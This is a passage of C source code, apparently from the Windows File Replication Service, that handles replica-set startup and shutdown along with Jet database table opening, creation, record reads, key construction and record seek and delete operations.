    // JRNL_STATE_STARTING before calling JrnlUnPauseVolume.
    //
    if (!FRS_SUCCESS(FStatus)) {

        NewServiceState = CNF_SERVICE_STATE_ERROR;

        pVme = Replica->pVme;

        if ((pVme == NULL) || (pVme->JournalState != JRNL_STATE_PAUSED)) {
            goto RETURN;
        }

        DPRINT1(4, ":S: ReplayUsn was: %08x %08x\n", PRINTQUAD(pVme->ReplayUsn));
        pVme->ReplayUsn = LOAD_JOURNAL_PROGRESS(pVme, pVme->JrnlReadPoint);
        pVme->ReplayUsnValid = TRUE;
        RESET_JOURNAL_PROGRESS(pVme);
        SET_JOURNAL_AND_REPLICA_STATE(pVme, JRNL_STATE_STARTING);
    }

    DPRINT1(4, ":S: ReplayUsn now: %08x %08x\n", PRINTQUAD(pVme->ReplayUsn));

    //
    // Crank up the first read on the journal to get it going.
    //
    WStatus = JrnlUnPauseVolume(Replica->pVme, NULL, FALSE);

    if (!WIN_SUCCESS(WStatus)) {
        DPRINT_WS(0, "Error from JrnlUnPauseVolume", WStatus);
        FStatus = FrsErrorJournalStartFailed;
    } else {
        DPRINT(5, ":S: JrnlUnPauseVolume success.\n");
        Replica->IsJournaling = TRUE;
    }


RETURN:

    //
    // If all went OK, this replica set is running.
    //
    SET_SERVICE_STATE(Replica, NewServiceState);

    //
    // If LastShutDown is zero save the current time so if we crash after
    // this point we won't think that this replica set has never started
    // but the service state in the config record is set to RUNNING.
    //
    if (NewServiceState == CNF_SERVICE_STATE_RUNNING) {

        //
        // Need to do this in the DBService thread since this is called by the
        // Replica command server and it has no DB thread context.
        //
        ConfigRecord = (PCONFIG_TABLE_RECORD) (Replica->ConfigTable.pDataRecord);
        if (ConfigRecord->LastShutdown == 0) {

            GetSystemTimeAsFileTime((PFILETIME)&ConfigRecord->LastShutdown);

            FStatus = DbsRequestReplicaServiceStateSave(Replica, TRUE);
            DPRINT_FS(0,"++ ERROR: DbsUpdateConfigTableFields error.", FStatus);
        }
    }

    RELEASE_DBS_INIT_LOCK;

    return FStatus;
}



ULONG
DbsShutdownSingleReplica(
    IN PTHREAD_CTX  ThreadCtx,
    IN PREPLICA     Replica
    )
/*++

Routine Description:

    Close the open tables for this replica set and update the config record.
    Set Replica service state to Stopped.  Put the Replica struct on the
    stopped list.

    ASSUMES: That this replica's journal is paused so we can write out
             the current progress point.

Arguments:

    ThreadCtx   - The thread context, provides session ID and database ID.

    Replica     - The Replica context, provides the table list for this replica.

Return Value:

    FrsError status.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsShutdownSingleReplica:"

    ULONG                 FStatus;

    FStatus = DbsCloseSessionReplicaTables(ThreadCtx, Replica);
    DPRINT1_FS(0,"++ ERROR - DbsCloseSessionReplicaTables failed on Replica %ws",
            Replica->ReplicaName->Name, FStatus);

    if (FStatus == FrsErrorSessionNotClosed) {
        JrnlSetReplicaState(Replica, REPLICA_STATE_STOPPED);
    } else

    if (!FRS_SUCCESS(FStatus)) {
        JrnlSetReplicaState(Replica, REPLICA_STATE_ERROR);

    } else {
        DPRINT1(4,"++ DbsCloseSessionReplicaTables RtCtx complete on %ws\n",
                Replica->ReplicaName->Name);
        JrnlSetReplicaState(Replica, REPLICA_STATE_STOPPED);
    }


    DPRINT(4, "\n");
    DPRINT1(4, "++ ==== start of Active INLOG Retry table dump for %ws ===========\n",
            Replica->ReplicaName->Name);
    DPRINT(4, "\n");

    QHashEnumerateTable(Replica->ActiveInlogRetryTable, QHashDump, NULL);
    DPRINT(4, "\n");
    DPRINT(4, "++ ==== End of Active INLOG Retry table dump ===========\n");
    DPRINT(4, "\n");


#if 0
    // Note: Perf: Can't do this until we know that all inprocess Local and
    // Remote COs are done.
    //
    // Release the memory for the Name Conflict table.
    //
    Replica->NameConflictTable = FrsFreeType(Replica->NameConflictTable);
    Replica->ActiveInlogRetryTable  = FrsFreeType(Replica->ActiveInlogRetryTable);
#endif

    return FStatus;

}



JET_ERR
DbsOpenTable0(
    IN  PTHREAD_CTX   ThreadCtx,
    IN  PTABLE_CTX    TableCtx,
    IN  ULONG         ReplicaNumber,
    OUT PCHAR         TableName,
    OUT JET_TABLEID  *Tid
    )
/*++

Routine Description:

    This function opens a jet table and inits the TableCtx with the table id,
    session id and replica number.  It returns the table name and the Tid.
    If the table is already open it checks that the Sesid from the TableCtx
    Matches the current session ID in the Thread context.  If the columnId
    fields in the JET_COLUMNCREATE structure are not defined then we get them
    from Jet.

    Macro Ref:  DBS_OPEN_TABLE

Arguments:

    ThreadCtx     -- ptr to the thread context.
    TableCtx      -- ptr to the table context.
    ReplicaNumber -- The ID number of the replica whose table is being opened.
    TableName     -- The full table name is returned.
    Tid           -- The Table ID is returned.

Return Value:

    Tid is returned as JET_tableidNil if the open fails.
    TableName is always returned (BaseTableName || ReplicaNumber)

    Jet status code as function return.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsOpenTable0:"

    JET_ERR           jerr, jerr1;
    JET_SESID         Sesid;
    JET_DBID          Dbid;
    PJET_TABLECREATE  JTableCreate;
    PJET_COLUMNCREATE JColDesc;
    JET_COLUMNDEF     JColDef;
    ULONG             NumberColumns;
    ULONG             i;
    PCHAR             BaseTableName;
    PCHAR             TName;
    PREPLICA          Replica;


    Dbid           = ThreadCtx->JDbid;
    Sesid          = ThreadCtx->JSesid;
    JTableCreate   = TableCtx->pJetTableCreate;
    BaseTableName  = JTableCreate->szTableName;


    // DUMP_TABLE_CTX(TableCtx);
    //
    // Construct the table name by suffixing with a 5 digit number.
    // (unless it's a single table).
    //
    if (BooleanFlagOn(TableCtx->PropertyFlags, FRS_TPF_SINGLE)) {
        TName = BaseTableName;
        strcpy(TableName, BaseTableName);
    } else {
        TName = TableName;
        sprintf(TableName, "%s%05d", BaseTableName, ReplicaNumber);
    }

    //
    // Check for Open Table and open it if necc.
    //
    if (!IS_TABLE_OPEN(TableCtx)) {

        //
        // Open the table.
        //
        jerr = JetOpenTable(Sesid, Dbid, TName, NULL, 0, 0, Tid);

        if ((!JET_SUCCESS(jerr)) && (jerr != JET_wrnTableEmpty)) {
            DPRINT1_JS(0, "++ ERROR - JetOpenTable (%s) :", TName, jerr);
            *Tid = JET_tableidNil;
            return jerr;
        }

        //
        // Update the table context.
        //
        TableCtx->Tid = *Tid;
        TableCtx->ReplicaNumber = ReplicaNumber;
        TableCtx->Sesid = Sesid;
    } else {
        //
        // Table is open.  Check the thread session ID for a match with the
        // session id used when the table was opened.
        //
        if (Sesid != TableCtx->Sesid) {
            DPRINT3(0, "++ ERROR - FrsOpenTable (%s) bad sesid : %08x should be %08x\n",
                    TName, Sesid, TableCtx->Sesid);

            *Tid = JET_tableidNil;
            return JET_errInvalidSesid;

        } else {
            //
            // Table is open and the session id matches.  Return TableCtx->Tid.
            //
            *Tid = TableCtx->Tid;

            //
            // Table number better match.
            //
            if (TableCtx->ReplicaNumber != ReplicaNumber) {
                DPRINT2(0, "++ ERROR - TableCtx is open for Replica number: %d, "
                       "  Now reusing it for %s without first closing\n",
                       ReplicaNumber, TableName);

                Replica = RcsFindReplicaByNumber(ReplicaNumber);
                if (Replica != NULL) {
                    FRS_PRINT_TYPE(0, Replica);
                } else {
                    DPRINT1(0, "++ SURPRISE - ReplicaNumber %d not found in lookup table\n", ReplicaNumber);
                }

                DUMP_TABLE_CTX(TableCtx);
                DBS_DISPLAY_RECORD_SEV(0, TableCtx, TRUE);
                FRS_ASSERT(!"DbsOpenReplicaTable: Open TableCtx is reused without close.");
            }
        }
    }

    //
    // Now check that the ColumnIds are defined in the JET_COLUMNCREATE struct.
    //

    JColDesc = JTableCreate->rgcolumncreate;

    if (JColDesc->columnid != JET_COLUMN_ID_NIL) {
        return JET_errSuccess;
    }
    NumberColumns  = JTableCreate->cColumns;

    for (i=0; i<NumberColumns; i++) {
        jerr = JetGetColumnInfo(Sesid,
                                Dbid,
                                TName,
                                JColDesc->szColumnName,
                                &JColDef,
                                sizeof(JColDef),
                                0);

        if (!JET_SUCCESS(jerr)) {
            DPRINT(0, "++ ERROR - Failed to get columnID. Can't open table.\n");
            DPRINT(0, "++ ERROR - Either old DB or someone changed the column name.\n");
            DPRINT2_JS(0, "++ ERROR - JetGetColumnInfo(%s) col(%s) : ",
                       JTableCreate->szTableName, JColDesc->szColumnName, jerr);

            DbsCloseTable(jerr1, Sesid, TableCtx);
            DPRINT_JS(0,"++ ERROR - JetCloseTable failed:", jerr1);

            *Tid = JET_tableidNil;
            return jerr;
        }


        JColDesc->columnid = JColDef.columnid;
        JColDesc += 1;
    }

    return  JET_errSuccess;
}



JET_ERR
DbsCreateJetTable (
    IN PTHREAD_CTX   ThreadCtx,
    IN PJET_TABLECREATE   JTableCreate
    )
/*++

Routine Description:

    This function creates a jet table with the columns and indexes.
    It checks the error returns.  It takes a JET_TABLECREATE
    struct which describes each column of the table and the indexes.  It returns
    the table ID and the column ID in the structure.

    If we fail to create all the columns or the indexes then the create table
    fails and the caller will cleanup by calling rollback.

Arguments:

    ThreadCtx   - The thread context, provides session ID and database ID.

    JTableCreate - The table descriptor struct.

Return Value:

    Jet status code.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsCreateJetTable:"

    JET_ERR    jerr;
    JET_SESID  Sesid;
    JET_DBID   Dbid;
    ULONG      j;
    ULONG              ColCount;
    JET_COLUMNCREATE  *ColList;
    ULONG              IndexCount;
    JET_INDEXCREATE   *IndexList;


    Sesid          = ThreadCtx->JSesid;
    Dbid           = ThreadCtx->JDbid;

    //
    // Call Jet to create the table with associated columns and indexes.
    //
    jerr = JetCreateTableColumnIndex(Sesid, Dbid, JTableCreate);
    CLEANUP1_JS(0, "ERROR - JetCreateTableColumnIndex(%s) :",
                JTableCreate->szTableName, jerr, RETURN);

    //
    // Make sure everything got created.
    //
    if (JTableCreate->cCreated == 0) {
        //
        // Error while creating the table.
        //
        jerr = JET_errNotInitialized;
        CLEANUP1_JS(0, "ERROR - JetCreateTableColumnIndex(%s) cCre == 0",
                    JTableCreate->szTableName, jerr, RETURN);

    } else if (JTableCreate->cCreated < (JTableCreate->cColumns+1)) {
        //
        // Error while creating the columns.
        // Check the error returns on each of the columns.
        //
        ColList = JTableCreate->rgcolumncreate;
        ColCount = JTableCreate->cColumns;
        for (j=0; j<ColCount; j++) {
            jerr = ColList[j].err;
            CLEANUP2_JS(0, "ERROR - JetCreateTableColumnIndex(%s) col(%s) :",
                       JTableCreate->szTableName, ColList[j].szColumnName, jerr, RETURN);
        }
        //
        // Even if no error above we still didn't create all the columns.
        //
        jerr = JET_errNotInitialized;
        CLEANUP2_JS(0, "ERROR - JetCreateTableColumnIndex(%s) col(%s) cCre < col count:",
                    JTableCreate->szTableName,
                    ColList[JTableCreate->cCreated-1].szColumnName, jerr, RETURN);

    } else if (JTableCreate->cIndexes &&
               JTableCreate->cCreated == (JTableCreate->cColumns+1)) {
        //
        // Error while creating the indexes
        //
        jerr = JET_errNotInitialized;
        CLEANUP1_JS(0, "ERROR - JetCreateTableColumnIndex(%s) :",
                    JTableCreate->szTableName, jerr, RETURN);

    } else if (JTableCreate->cCreated <
              (JTableCreate->cColumns + JTableCreate->cIndexes + 1)) {
        //
        // Not all indexes were created.  This test should never occur
        // because jet should return JET_wrnCreateIndexFailed instead.
        // Check the error returns on each of the index creates.
        //
        IndexList = JTableCreate->rgindexcreate;
        IndexCount = JTableCreate->cIndexes;
        for (j=0; j<IndexCount; j++) {
            jerr = IndexList[j].err;
            CLEANUP2_JS(0, "ERROR - JetCreateTableColumnIndex(%s) index(%s) :",
                        JTableCreate->szTableName, IndexList[j].szIndexName, jerr, RETURN);
        }

        //
        // Even if no error above we still didn't create all the indexes.
        //
        jerr = JET_errNotInitialized;
        CLEANUP2_JS(0, "ERROR - JetCreateTableColumnIndex(%s) Index(%s) cre fail :",
                JTableCreate->szTableName,
                IndexList[JTableCreate->cCreated - (1 + JTableCreate->cColumns)].szIndexName,
                jerr, RETURN);
    }

    //
    // Apparently no error occurred.
    // But check the column and index error returns just to be sure.
    // Check the error returns on each of the columns.
    //
    ColList = JTableCreate->rgcolumncreate;
    ColCount = JTableCreate->cColumns;
    for (j=0; j<ColCount; j++) {
        jerr = ColList[j].err;
        CLEANUP2_JS(0, "ERROR - JetCreateTableColumnIndex(%s) col(%s) :",
                    JTableCreate->szTableName, ColList[j].szColumnName, jerr, RETURN);
    }

    //
    // Check the error returns on each of the index creates.
    //
    IndexList = JTableCreate->rgindexcreate;
    IndexCount = JTableCreate->cIndexes;
    for (j=0; j<IndexCount; j++) {
        jerr = IndexList[j].err;
        CLEANUP2_JS(0, "ERROR - JetCreateTableColumnIndex(%s) index(%s) :",
                    JTableCreate->szTableName, IndexList[j].szIndexName, jerr, RETURN);
    }

RETURN:
    return jerr;
}



ULONG
DbsTableRead(
    IN PTHREAD_CTX   ThreadCtx,
    IN PTABLE_CTX    TableCtx
    )
/*++

Routine Description:

    This routine reads a record from the open table specified by the table
    ctx.  It assumes the TableCtx storage is initialized and has been positioned
    to the desired record.

Arguments:

    ThreadCtx - A thread context for accessing Jet.
    TableCtx - A ptr to the Table context of the open table to enumerate.

Thread Return Value:

    Frs error status.

--*/

{
#undef DEBSUB
#define DEBSUB "DbsTableRead:"

    JET_ERR              jerr, jerr1;
    ULONG                FStatus = FrsErrorSuccess;
    JET_SESID            Sesid;
    PJET_TABLECREATE     JTableCreate;
    PJET_RETRIEVECOLUMN  JRetColumn;
    PJET_COLUMNCREATE    JColDesc;
    JET_TABLEID          Tid;
    ULONG                NumberColumns;
    ULONG                i;
    PRECORD_FIELDS       FieldInfo;

    //
    // Point to the table create struct for column info and the
    // pointer to the record fields struct.
    //
    JTableCreate = TableCtx->pJetTableCreate;
    FieldInfo    = TableCtx->pRecordFields + 1;   // jump over elt 0

    Sesid          = ThreadCtx->JSesid;

    JRetColumn     = TableCtx->pJetRetCol;
    Tid            = TableCtx->Tid;

    NumberColumns  = JTableCreate->cColumns;
    JColDesc       = JTableCreate->rgcolumncreate;


#if 0
    //
    // Debug loop to retrieve columns one by one.
    //
    jerr = JET_errSuccess;
    for (i=0; i<NumberColumns; i++) {

        jerr1 = JetRetrieveColumn (Sesid,
                                   Tid,
                                   JRetColumn[i].columnid,
                                   JRetColumn[i].pvData,
                                   JRetColumn[i].cbData,
                                   &JRetColumn[i].cbActual,
                                   0,
                                   NULL);

        JRetColumn[i].err = jerr1;

        //DPRINT6(0, "JetRetrieveColumn(%2d): status %d, Sesid %08x, Tid %08x, Colid %5d, pvData %08x, ",
        //        i, jerr1, Sesid, Tid, JRetColumn[i].columnid, JRetColumn[i].pvData);
        //printf("cbData %5d, CbActual %5d\n", JRetColumn[i].cbData, JRetColumn[i].cbActual);

        DPRINT2_JS(0, "JetRetrieveColumn error on table (%s) for field (%s) :",
                   TableName, JTableCreate->rgcolumncreate[i].szColumnName, jerr1);
        jerr = JET_SUCCESS(jerr) ? jerr1 : jerr;
    }
    FStatus = DbsTranslateJetError(jerr, FALSE);
#endif


    jerr = JetRetrieveColumns(Sesid, Tid, JRetColumn, NumberColumns);

    if (!JET_SUCCESS(jerr)) {
        DPRINT1_JS(0, "JetRetrieveColumns on (%s) :", JTableCreate->szTableName, jerr);
        DBS_DISPLAY_RECORD_SEV(5, TableCtx, TRUE);

        if (jerr == JET_errRecordDeleted) {
            DPRINT1(0, "ERROR - Table (%s) Record is deleted\n", JTableCreate->szTableName);
            FStatus = DbsTranslateJetError(jerr, FALSE);
        } else {
            //
            // Try again.  Maybe we had some buffer too small problems.
            //
            jerr = DbsCheckSetRetrieveErrors(TableCtx);

            if (!JET_SUCCESS(jerr)) {
                DPRINT1_JS(0, "CheckRetrieveColumns on (%s) :", JTableCreate->szTableName, jerr);
                FStatus = DbsTranslateJetError(jerr, FALSE);
                DBS_DISPLAY_RECORD_SEV(1, TableCtx, TRUE);
            }
        }
    } else {
        //
        // need to scan the error codes for warnings like JET_wrnColumnNull.
        // JetRetrieveColumns() above doesn't return this status.
        //
        for (i=0; i<NumberColumns; i++) {

            //
            // Skip spare fields.
            //
            if (IsSpareField(FieldInfo[i].DataType)) {
                continue;
            }

            //
            // Null column is not an error but if it is for a fixed sized
            // buffer with a variable length field then zero the buffer.
            //
            if (JRetColumn[i].err == JET_wrnColumnNull) {
                if ((IsFixedSzBufferField(FieldInfo[i].DataType)) &&
                    (JColDesc[i].coltyp == JET_coltypLongBinary)) {

                    //
                    // Makes logs very noisy on startup when IDTable is scanned.
                    // Also when outlog gets big.
                    //
                    //DPRINT1(5, "++ Null jet data column (%s) for fixed size buffer, zeroing\n",
                    //        JColDesc[i].szColumnName);

                    ZeroMemory(JRetColumn[i].pvData, FieldInfo[i].Size);
                }
            } else {
                //
                // Some other type of retrieve error.  Complain.
                //
                jerr = JRetColumn[i].err;
                DPRINT1_JS(5, "++ Jet retrieve error for column %s :",
                          JColDesc[i].szColumnName, jerr);
            }
        }
    }

    return FStatus;
}


JET_ERR
DbsMakeKey(
    IN JET_SESID    Sesid,
    IN JET_TABLEID  Tid,
    IN PCHAR        IndexName,
    IN PVOID       *KeyValueArray)
{
/*++

Routine Description:

    Decode the Index name and pass the value of each key segment to
    JetMakeKey.

    Assumes:  The caller has opened the table and called JetSetCurrentIndex.

Arguments:

    Sesid  -- A jet session ID.
    Tid    -- The table ID for this table.
    IndexName -- The index name string to decode for this index.
    KeyValueArray - Each entry in the array is a pointer to the key value for
                    the respective key segment.

Return Value:

    Jet error status.

--*/
#undef DEBSUB
#define DEBSUB "DbsMakeKey:"

    JET_ERR      jerr;
    ULONG        i = 0;
    ULONG        NumKeys = 1;
    ULONG        KeyLength;
    PVOID        KeyValue;
    CHAR         KeyLengthCode;
    CHAR         GuidStr[GUID_CHAR_LEN];
    PCHAR        Format;
    JET_GRBIT    KeyFlags = JET_bitNewKey;
    BOOL         MultiKeyLookup = FALSE;

#define DMK_SEV 4

    //
    // If the first character of the Index Name is a digit then this index is
    // composed of n keys.  The following n characters tell us how to compute
    // the keylength for each component.  E.G. a 2 key index on a Guid and a
    // Long binary would have a name prefix of "2GL...".
    // If the first character is not a digit then this is a single key index
    // and the first character is the key length code as follows:
    //
    //  L: Long binary     length is 4 bytes
    //  Q: Quad binary     length is 8 bytes
    //  G: 16 byte GUID    length is 16 bytes
    //  W: Wide Char       length is 2 * wcslen
    //  C: Narrow Char     length is strlen
    //
    KeyLengthCode = IndexName[i];
    MultiKeyLookup = (KeyLengthCode > '0') && (KeyLengthCode <= '9');

    if (MultiKeyLookup) {
        NumKeys = KeyLengthCode - '0';
        KeyLengthCode = IndexName[++i];
        DPRINT2(DMK_SEV, "++ Multi-valued key: %s, %d\n", IndexName, NumKeys);
    }

    while (NumKeys-- > 0) {

        KeyValue = *KeyValueArray;
        KeyValueArray += 1;
        //
        // Calculate the key length.
        //
               if (KeyLengthCode == 'L') {KeyLength = 4;
        } else if (KeyLengthCode == 'Q') {KeyLength = 8;
        } else if (KeyLengthCode == 'G') {KeyLength = 16;
        } else if (KeyLengthCode == 'C') {KeyLength = strlen((PCHAR)KeyValue)+1;
        } else if (KeyLengthCode == 'W') {KeyLength = 2 * (wcslen((PWCHAR)KeyValue)+1);
        } else {
            return JET_errIndexInvalidDef;
        }

        //
        // Print out the KeyValue using the correct format.
        //
        if (MultiKeyLookup) {
                   if (KeyLengthCode == 'L') {Format = "++ MakeKey: Index %s, KeyValue = %d,  KeyLen = %d\n";
            } else if (KeyLengthCode == 'Q') {Format = "++ MakeKey: Index %s, KeyValue = %08x %08x, KeyLen = %d\n";
            } else if (KeyLengthCode == 'G') {Format = "++ MakeKey: Index %s, KeyValue = %s,  KeyLen = %d\n";
            } else if (KeyLengthCode == 'C') {Format = "++ MakeKey: Index %s, KeyValue = %s,  KeyLen = %d\n";
            } else if (KeyLengthCode == 'W') {Format = "++ MakeKey: Index %s, KeyValue = %ws, KeyLen = %d\n";
            };

            if (KeyLengthCode == 'L') {
                DPRINT3(DMK_SEV, Format, IndexName, *(PULONG)KeyValue, KeyLength);
            } else

            if (KeyLengthCode == 'Q') {
                DPRINT4(DMK_SEV, Format, IndexName, *((PULONG)KeyValue+1), *(PULONG)KeyValue, KeyLength);
            } else

            if (KeyLengthCode == 'G') {
                GuidToStr((GUID *)KeyValue, GuidStr);
                DPRINT3(DMK_SEV, Format, IndexName, GuidStr, KeyLength);
            } else {
                DPRINT3(DMK_SEV, Format, IndexName, KeyValue, KeyLength);
            }
        }

        //
        // Give Jet the next key segment.
        //
        jerr = JetMakeKey(Sesid, Tid, KeyValue, KeyLength, KeyFlags);
        CLEANUP1_JS(0, "++ JetMakeKey error on key segment %d :", i, jerr, RETURN);

        KeyFlags = 0;
        KeyLengthCode = IndexName[++i];
    }

    jerr = JET_errSuccess;

RETURN:
    return jerr;
}


JET_ERR
DbsRecordOperation(
    IN PTHREAD_CTX   ThreadCtx,
    IN ULONG         Operation,
    IN PVOID         KeyValue,
    IN ULONG         RecordIndex,
    IN PTABLE_CTX    TableCtx
    )

/*++

Routine Description:

    This function opens the table specified by the table context
    (if it's not already open) and performs the operation on a record
    with Key = RecordName and Index = RecordIndex.
    For a read the data is loaded into the TableCtx data record.
    The variable length buffers are allocated as needed.

    If the TableCtx->Tid field is NOT JET_tableidNil then
    we assume it is good FOR THIS SESSION and do not reopen the table.
    If the Table was not opened by the caller then we close it at the
    end of the operation UNLESS the operation is only a seek request.
    So for read and delte requests, if you want the table open after the
    call then the caller must open it.

    Note:  NEVER use table IDs across sessions or threads.

    Note:  The Delete operation assumes the caller handles the begin
           and commit transaction details.  If you want a simple one shot
           delete use DbsDeleteTableRecord().

    MacroRef:  DbsReadRecord
    MacroRef:  DbsDeleteRecord
    MacroRef:  DbsSeekRecord

Arguments:

    ThreadCtx  - Provides the Jet Sesid and Dbid.

    Operation  - The request operation.  SEEK, READ or DELETE.

    KeyValue   - The key value of the desired record to operate on.

    RecordIndex - The index to use when accessing the table.  From the index
                  enum list for the table in schema.h.

    TableCtx   - The table context uses the following:

            JTableCreate - The table create structure which provides info
                           about the columns that were created in the table.

            JRetColumn - The JET_RETRIEVECOLUMN struct array to tell
                         Jet where to put the data.

            ReplicaNumber - The id number of the replica this table belongs too.

Return Value:

    Jet Status.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsRecordOperation:"

    JET_ERR      jerr, jerr1;
    JET_SESID    Sesid;
    JET_TABLEID  Tid;
    ULONG        i;
    NTSTATUS     Status;
    ULONG        ReplicaNumber;
    ULONG        FStatus;
    PCHAR        BaseTableName;
    PCHAR        IndexName;
    ULONG        NumberColumns;
    CHAR         TableName[JET_cbNameMost];
    JET_TABLEID  FrsOpenTableSaveTid;   // for FrsOpenTableMacro

    PJET_TABLECREATE    JTableCreate;
    PJET_INDEXCREATE    JIndexDesc;
    PJET_RETRIEVECOLUMN JRetColumn;


    Sesid          = ThreadCtx->JSesid;
    ReplicaNumber  = TableCtx->ReplicaNumber;

    //
    // Open the table, if it's not already open. Check the session id for match.
    // It returns constructed table name and Tid.
    //
    jerr = DBS_OPEN_TABLE(ThreadCtx, TableCtx, ReplicaNumber, TableName, &Tid);
    CLEANUP1_JS(0, "ERROR - FrsOpenTable (%s) :", TableName, jerr, RETURN);

    //
    // Get the ptr to the table create struct, the retrieve col struct and the
    // and the Tid from the TableCtx.  Get the base of the Index Descriptor
    // array, the number of columns in the table and the base table name from
    // the jet table create struct.
    //
    JTableCreate   = TableCtx->pJetTableCreate;
    JRetColumn     = TableCtx->pJetRetCol;
    Tid            = TableCtx->Tid;

    JIndexDesc     = JTableCreate->rgindexcreate;
    NumberColumns  = JTableCreate->cColumns;
    BaseTableName  = JTableCreate->szTableName;

    //
    // Get the index name based on RecordIndex argument.
    //
    IndexName = JIndexDesc[RecordIndex].szIndexName;

    //
    // Use the specified index.
    // perf: - should we remember this in the TableCtx to avoid the call?
    //
    jerr = JetSetCurrentIndex(Sesid, Tid, IndexName);
    CLEANUP_JS(0, "ERROR - JetSetCurrentIndex error:", jerr, ERROR_RET_TABLE);

    //
    // Make the key value for the target record.
    //
    jerr = DbsMakeKey(Sesid, Tid, IndexName, &KeyValue);
    if (!JET_SUCCESS(jerr)) {
        if (jerr == JET_errIndexInvalidDef) {
            sprintf(TableName, "%s%05d", BaseTableName, TableCtx->ReplicaNumber);
            DPRINT2(0, "++ Schema error - Invalid keycode on index (%s) accessing table (%s)\n",
                   IndexName, TableName);
        }
        DbsTranslateJetError(jerr, TRUE);
        goto ERROR_RET_TABLE;
    }

    //
    // Seek to the record.
    //
    jerr = JetSeek(Sesid, Tid, JET_bitSeekEQ);

    //
    // If the record is not there (we were looking for equality) then return.
    //
    if (jerr == JET_errRecordNotFound) {
        DPRINT_JS(4, "JetSeek - ", jerr);
        return jerr;
    }
    CLEANUP_JS(0, "JetSeek error:", jerr, ERROR_RET_TABLE);

    //
    // Perform Record read if requested.
    //
    if (Operation & ROP_READ) {
        //
        // Initialize the JetSet/RetCol arrays and data record buffer addresses
        // to read and write the fields of the ConfigTable records into ConfigRecord.
        //
        DbsSetJetColSize(TableCtx);
        DbsSetJetColAddr(TableCtx);

        //
        // Allocate the storage for the variable length fields in the record and
        // update the JetSet/RetCol arrays appropriately.
        //
        Status = DbsAllocRecordStorage(TableCtx);
        CLEANUP_NT(0, "++ ERROR - DbsAllocRecordStorage failed to alloc buffers.",
                   Status, ERROR_RET_FREE_RECORD);

        //
        // Now read the record.
        //
        FStatus = DbsTableRead(ThreadCtx, TableCtx);
        if (!FRS_SUCCESS(FStatus)) {
            DPRINT_FS(0, "Error - can't read selected record.", FStatus);
            jerr = JET_errRecordNotFound;
            goto ERROR_RET_FREE_RECORD;
        }
        DBS_DISPLAY_RECORD_SEV(5, TableCtx, TRUE);

    }

    //
    // Perform record delete if requested.
    //
    if (Operation & ROP_DELETE) {
        jerr = JetDelete(Sesid, Tid);
        DPRINT1_JS(0, "JetDelete error for %s :", TableName, jerr);
    }

    //
    // Close the table if this function opened it and operation was not a seek.
    //
    if ((Operation != ROP_SEEK) && (FrsOpenTableSaveTid == JET_tableidNil)) {
        DbsCloseTable(jerr1, Sesid, TableCtx);
        DPRINT1_JS(0, "DbsCloseTable error %s :", TableName, jerr1);
    }

    //
    // Success.
    //
RETURN:

    return jerr;

ERROR_RET_FREE_RECORD:

    //
    // Free any runtime allocated record buffers.
    //
    DbsFreeRecordStorage(TableCtx);

ERROR_RET_TABLE:

    //
    // Close the table and reset TableCtx Tid and Sesid.   Macro writes 1st arg.
    //
    DbsCloseTable(jerr1, Sesid, TableCtx);

    return jerr;
}



ULONG
DbsRecordOperationMKey(
    IN PTHREAD_CTX   ThreadCtx,
    IN ULONG         Operation,
    IN PVOID         *KeyValueArray,
    IN ULONG         RecordIndex,
    IN PTABLE_CTX    TableCtx
    )

/*++

Routine Description:

    This function opens the table specified by the table context
    (if it's not already open) and performs the operation on a record
    with a multivalued key.
    For a read the data is loaded into the TableCtx data record.
    The variable length buffers are allocated as needed.

    If the TableCtx->Tid field is NOT JET_tableidNil then
    we assume it is good FOR THIS SESSION and do not reopen the table.
    If the Table was not opened by the caller then we close it at the
    end of the operation UNLESS the operation is only a seek request.
    So for read and delte requests, if you want the table open after the
    call then the caller must open it.

    Note:  NEVER use table IDs across sessions or threads.

    Note:  The Delete operation assumes the caller handles the begin
           and commit transaction details.  If you want a simple one shot
           delete use DbsDeleteTableRecord().

Arguments:

    ThreadCtx  - Provides the Jet Sesid and Dbid.

    Operation  - The request operation.  SEEK, READ or DELETE.

    KeyValueArray -  A ptr array to the key values for a multi-key index.

    RecordIndex - The index to use when accessing the table.  From the index
                  enum list for the table in schema.h.

    TableCtx   - The table context uses the following:

            JTableCreate - The table create structure which provides info
                           about the columns that were created in the table.

            JRetColumn - The JET_RETRIEVECOLUMN struct array to tell
                         Jet where to put the data.

            ReplicaNumber - The id number of the replica this table belongs too.

Return Value:

    Frs Status.

--*/
{
#undef DEBSUB
#define DEBSUB "DbsRecordOperationMKey:"

    JET_ERR      jerr, jerr1;
    JET_SESID    Sesid;
    JET_TABLEID  Tid;
    ULONG        i;
    NTSTATUS     Status;
    ULONG        ReplicaNumber;
    ULONG        FStatus = FRS_MAX_ERROR_CODE;
    PCHAR        BaseTableName;
    PCHAR        IndexName;
    CHAR         TableName[JET_cbNameMost];
    JET_TABLEID  FrsOpenTableSaveTid;   // for FrsOpenTableMacro

    PJET_TABLECREATE    JTableCreate;
    PJET_INDEXCREATE    JIndexDesc;
    PJET_RETRIEVECOLUMN JRetColumn;


    Sesid          = ThreadCtx->JSesid;
    ReplicaNumber  = TableCtx->ReplicaNumber;

    //
    // Open the table, if it's not already open. Check the session id for match.
    // It returns constructed table name and Tid.
    //
    jerr = DBS_OPEN_TABLE(ThreadCtx, TableCtx, ReplicaNumber, TableName, &Tid);
    CLEANUP1_JS(0, "ERROR - FrsOpenTable (%s) :", TableName, jerr, ERROR_RET_FREE_RECORD);

    //
    // Get the ptr to the table create struct, the retrieve col struct and the
    // and the Tid from the TableCtx.  Get the base of the Index Descriptor
    // array, the number of columns in the table and the base table name from
    // the jet table create struct.
    //
    JTableCreate   = TableCtx->pJetTableCreate;
    JRetColumn     = TableCtx->pJetRetCol;
    Tid            = TableCtx->Tid;

    JIndexDesc     = JTableCreate->rgindexcreate;
    BaseTableName  = JTableCreate->szTableName;

    //
    // Get the index name based on RecordIndex argument.
    //
    IndexName      = JIndexDesc[RecordIndex].szIndexName;

    //
    // Use the specified index.
    // perf: - should we remember this in the TableCtx to avoid the call?
    //
    jerr = JetSetCurrentIndex(Sesid, Tid, IndexName);
    CLEANUP_JS(0, "ERROR - JetSetCurrentIndex error:", jerr, RET_CLOSE_TABLE);

    //
    // Make the key value for the target record.
    //
    jerr = DbsMakeKey(Sesid, Tid, IndexName, KeyValueArray);
